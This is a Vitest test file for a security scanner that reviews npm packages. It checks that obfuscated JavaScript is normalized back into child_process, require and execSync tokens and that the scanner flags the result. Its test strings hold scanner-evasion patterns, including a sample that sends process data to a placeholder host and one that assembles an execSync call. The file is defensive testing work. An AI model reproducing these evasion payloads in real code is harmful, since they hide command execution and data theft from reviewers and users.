import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { describe, expect, test } from "vitest";
import { normalizeCodeForScanning } from "../server/lib/review/rules/normalize";
import { computeRisk, createPackageDiff, deterministicFindings } from "../server/lib/review";

const __dirname = dirname(fileURLToPath(import.meta.url));

describe("normalizeCodeForScanning", () => {
  test("folds a string-concatenation chain", () => {
    expect(normalizeCodeForScanning("const p = 'chi' + 'ld_pro' + 'cess';")).toContain(
      "child_process",
    );
  });

  test("folds [...].join('') array assembly", () => {
    expect(normalizeCodeForScanning("['chi','ld_pro','cess'].join('')")).toBe('"child_process"');
  });

  test("honors a non-empty join separator and the default comma separator", () => {
    expect(normalizeCodeForScanning("['a','b'].join('-')")).toBe('"a-b"');
    expect(normalizeCodeForScanning("['a','b'].join()")).toBe('"a,b"');
  });

  test("resolves literal-keyed computed member access to dotted access", () => {
    expect(normalizeCodeForScanning("globalThis['re' + 'quire']")).toBe("globalThis.require");
    expect(normalizeCodeForScanning("process['e' + 'nv']")).toBe("process.env");
  });

  test("decodes hex and unicode escapes before folding", () => {
    // \x63 === "c", \x65 === "e"
    expect(normalizeCodeForScanning("'\\x63hild_pro' + 'cess'")).toContain("child_process");
    expect(normalizeCodeForScanning("globalThis['r\\x65quir\\u0065']")).toBe("globalThis.require");
  });

  test("reassembles the full assembled-require-exfil payload into literal sinks", () => {
    const source = [
      "const p = ['chi','ld_pro','cess'].join('');",
      "const r = globalThis['re' + 'quire'];",
      "const data = globalThis['proc' + 'ess'];",
      "net['req' + 'uest']('https://example.invalid/c')['en' + 'd'](data);",
      "cp['exec' + 'Sync']('echo go');",
    ].join("\n");
    const normalized = normalizeCodeForScanning(source);
    expect(normalized).toContain("child_process");
    expect(normalized).toContain("globalThis.require");
    expect(normalized).toContain("globalThis.process");
    expect(normalized).toContain(".request(");
    expect(normalized).toContain(".end(");
    expect(normalized).toContain(".execSync(");
  });

  test("never folds tokens that live inside a string literal", () => {
    const source = "const label = \"value is 'a' + 'b'\";";
    expect(normalizeCodeForScanning(source)).toBe(source);
  });

  test("never folds tokens inside comments", () => {
    const line = "// assembled: 'chi' + 'ld_process'";
    const block = "/* x['re' + 'quire'] */";
    expect(normalizeCodeForScanning(line)).toBe(line);
    expect(normalizeCodeForScanning(block)).toBe(block);
  });

  test("never folds tokens inside a regex literal", () => {
    const source = "const re = /'a' + 'b'/;";
    expect(normalizeCodeForScanning(source)).toBe(source);
  });

  test("never folds inside strings containing JSON-superset line separators", () => {
    for (const separator of ["\u2028", "\u2029"]) {
      const source = `const text="before${separator}'chi'+'ld_process';after";`;

      expect(normalizeCodeForScanning(source)).toBe(source);
    }
  });

  test("never folds regex contents after labeled or case-clause blocks", () => {
    const labelSource = "label:{foo()}/'chi' + 'ld_process'/.test(a)";
    const caseSource = "switch(a){case 1:{foo()}/'chi' + 'ld_process'/.test(a)}";

    expect(normalizeCodeForScanning(labelSource)).toBe(labelSource);
    expect(normalizeCodeForScanning(caseSource)).toBe(caseSource);
  });

  test("never folds regex contents after labeled blocks inside IIFE wrappers", () => {
    const source = "!function(){e:{foo()}/'chi' + 'ld_process'/.test(a)}()";

    expect(normalizeCodeForScanning(source)).toBe(source);
  });

  test("never folds regex contents after typed or declaration bodies", () => {
    const functionSource = "function f():void{}/'chi' + 'ld_process'/.test(a)";
    const interfaceSource = "interface Result{value:string}/'chi' + 'ld_process'/.test(a)";

    expect(normalizeCodeForScanning(functionSource)).toBe(functionSource);
    expect(normalizeCodeForScanning(interfaceSource)).toBe(interfaceSource);
  });

  test("never folds regex contents after prefixed or decorated declarations", () => {
    for (const source of [
      "export default interface Result{value:string}/'chi' + 'ld_process'/.test(a)",
      "export default enum Result{Value}/'chi' + 'ld_process'/.test(a)",
      "declare global{interface Result{value:string}}/'chi' + 'ld_process'/.test(a)",
      "@sealed class Result{}/'chi' + 'ld_process'/.test(a)",
      "@sealed({deep:true}) class Result{}/'chi' + 'ld_process'/.test(a)",
    ]) {
      expect(normalizeCodeForScanning(source)).toBe(source);
    }
  });

  test("never folds regex contents after ASI-terminated statements or type aliases", () => {
    const debuggerSource = "debugger\n/'chi' + 'ld_process'/.test(a)";
    const typeSource = "type Result={value:string}\n/'chi' + 'ld_process'/.test(a)";

    expect(normalizeCodeForScanning(debuggerSource)).toBe(debuggerSource);
    expect(normalizeCodeForScanning(typeSource)).toBe(typeSource);
  });

  test("keeps scanning after division by a Unicode identifier", () => {
    const source = "const π=1;const ratio=π/2;const name='chi'+'ld_process';";

    expect(normalizeCodeForScanning(source)).toContain('const name="child_process";');
  });

  test("keeps scanning after division by an exported string initializer", () => {
    const source =
      "export const padding='safe'\n/2;" +
      "const p=['chi','ld_pro','cess'].join('');" +
      "const r=globalThis['re'+'quire'];";

    const normalized = normalizeCodeForScanning(source);
    expect(normalized).toContain('const p="child_process";');
    expect(normalized).toContain("const r=globalThis.require;");
  });

  test("keeps scanning after division by function and class expression results", () => {
    for (const prefix of [
      "const padding=function(){} / 2;",
      "const padding=class{} / 2;",
      "const padding=async function(){} / 2;",
    ]) {
      const source = `${prefix}const name='chi'+'ld_process';`;

      expect(normalizeCodeForScanning(source)).toContain('const name="child_process";');
    }
  });

  test("keeps scanning after division by keyword-named member calls", () => {
    for (const prefix of ["const padding=obj.if(value)/2;", "const padding=obj?.while(value)/2;"]) {
      const source = `${prefix}const name='chi'+'ld_process';`;

      expect(normalizeCodeForScanning(source)).toContain('const name="child_process";');
    }
  });

  test("keeps scanning when a line-terminated break is followed by a divided value", () => {
    const source = "while(true){break\nvalue\n/2;const name='chi'+'ld_process';}";

    expect(normalizeCodeForScanning(source)).toContain('const name="child_process";');
  });

  test("never folds inside regex statements after static module declarations", () => {
    for (const source of [
      "import 'x'\n/'chi' + 'ld_process'/.test(value)",
      "import { x } from 'x'\n/'chi' + 'ld_process'/.test(value)",
      "const x=1;export { x }\n/'chi' + 'ld_process'/.test(value)",
    ]) {
      expect(normalizeCodeForScanning(source)).toBe(source);
    }
  });

  test("leaves template literals untouched", () => {
    const source = "const t = `${'a' + 'b'}`;";
    expect(normalizeCodeForScanning(source)).toBe(source);
  });

  test("does not fold a concatenation that spans a newline (line numbers stay stable)", () => {
    const source = "const p = 'chi' +\n  'ld_process';";
    const normalized = normalizeCodeForScanning(source);
    expect(normalized).toBe(source);
    expect(normalized.split("\n").length).toBe(source.split("\n").length);
  });

  test("preserves line count for a folded multi-line file", () => {
    const source = [
      "const a = ['x','y'].join('');",
      "const b = globalThis['re' + 'quire'];",
      "const c = 1;",
    ].join("\n");
    expect(normalizeCodeForScanning(source).split("\n").length).toBe(3);
  });

  test("does not rewrite array literals that are not member access", () => {
    // A bare array literal assigned to a value is not computed member access.
    expect(normalizeCodeForScanning("const list = ['only'];")).toBe("const list = ['only'];");
  });

  test("is a no-op for code with nothing to fold", () => {
    const source = "export const answer = 42;\nconst x = require('fs');\n";
    expect(normalizeCodeForScanning(source)).toBe(source);
  });
});

describe("assembled-identifier evasion is caught by the deterministic scanner", () => {
  test("frontier npm-assembled-require-exfil reaches high risk via the folded code rules", () => {
    const fixture = JSON.parse(
      readFileSync(
        join(__dirname, "fixtures/security-corpus/cases-frontier/npm-assembled-require-exfil.json"),
        "utf8",
      ),
    );
    const diff = createPackageDiff(fixture.previousFiles, fixture.stagedFiles);
    const findings = deterministicFindings(fixture.stagedFiles, diff, fixture.stagedPackageJson);

    expect(computeRisk(findings)).toBe("high");
    expect(findings.some((f) => f.ruleId === "code.process-execution")).toBe(true);
  });

  test("a divided function expression cannot hide the assembled process sink", () => {
    const payload =
      "const p=['chi','ld_pro','cess'].join('');const r=globalThis['re'+'quire'];" +
      "const cp=r(p);cp['exec'+'Sync']('id')";
    const staged = [
      {
        path: "index.js",
        size: payload.length,
        sha256: "index-js",
        flags: [],
        textSample: `const padding=function(){} / 2;${payload}`,
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(computeRisk(findings)).toBe("high");
    expect(findings.some((finding) => finding.ruleId === "code.process-execution")).toBe(true);
  });

  test("a divided exported initializer cannot hide the assembled process sink", () => {
    const payload =
      "const p=['chi','ld_pro','cess'].join('');const r=globalThis['re'+'quire'];" +
      "const cp=r(p);cp['exec'+'Sync']('id')";
    const staged = [
      {
        path: "index.js",
        size: payload.length,
        sha256: "index-js",
        flags: [],
        textSample: `export const padding={}\n/2;${payload}`,
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(computeRisk(findings)).toBe("high");
    expect(findings.some((finding) => finding.ruleId === "code.process-execution")).toBe(true);
  });

  test("a divided keyword-named member call cannot hide the assembled process sink", () => {
    const payload =
      "const p=['chi','ld_pro','cess'].join('');const r=globalThis['re'+'quire'];" +
      "const cp=r(p);cp['exec'+'Sync']('id')";
    const staged = [
      {
        path: "index.js",
        size: payload.length,
        sha256: "index-js",
        flags: [],
        textSample: `const padding=obj.if(value)/2;${payload}`,
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(computeRisk(findings)).toBe("high");
    expect(findings.some((finding) => finding.ruleId === "code.process-execution")).toBe(true);
  });

  test("JSON-superset line separators in strings cannot fabricate process execution", () => {
    const safe = `const text="before\u2028'chi'+'ld_process';after";`;
    const staged = [
      {
        path: "index.js",
        size: safe.length,
        sha256: "index-js",
        flags: [],
        textSample: safe,
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "code.process-execution")).toBe(false);
  });
});
